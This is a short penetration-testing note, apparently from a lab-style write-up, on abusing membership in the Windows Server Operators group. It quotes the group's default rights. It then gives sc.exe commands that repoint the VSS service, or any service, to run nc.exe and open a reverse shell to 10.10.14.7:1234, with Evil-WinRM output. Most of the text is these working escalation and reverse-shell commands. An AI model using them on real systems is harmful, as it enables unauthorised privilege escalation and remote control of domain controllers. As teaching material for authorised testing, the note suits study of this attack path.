_____

```cmd
whoami /groups
```

# Server Operators

https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators

Server Operators. [This group](https://ss64.com/nt/syntax-security_groups.html#:~:text=A%20built%2Din%20group%20that,and%20shut%20down%20the%20computer.) can do a lot of things:

> A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer. Default [User Rights](https://ss64.com/nt/ntrights.html): Allow log on locally: SeInteractiveLogonRight Back up files and directories: SeBackupPrivilege Change the system time: SeSystemTimePrivilege Change the time zone: SeTimeZonePrivilege Force shutdown from a remote system: SeRemoteShutdownPrivilege Restore files and directories SeRestorePrivilege Shut down the system: SeShutdownPrivilege


https://cube0x0.github.io/Pocing-Beyond-DA/

User can modify, start, and stop services, so I’ll abuse this by having it run `nc64.exe` to give a reverse shell.

```cmd
sc.exe config VSS binpath="C:\programdata\nc.exe -e cmd 10.10.14.7 1234"
```

**Stop** the service, but it’s not started. Then I’ll start it:

```
*Evil-WinRM* PS C:\programdata> sc.exe stop VSS
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\programdata> sc.exe start VSS
```

Another way,
```cmd
sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc.exe -e cmd 10.10.14.7 1234"
```

Another way, (modify existent service)

```cmd
services
```

```cmd
sc.exe config SERVICE binPath="C:\programdata\nc.exe -e cmd 10.10.14.7 1234"
```
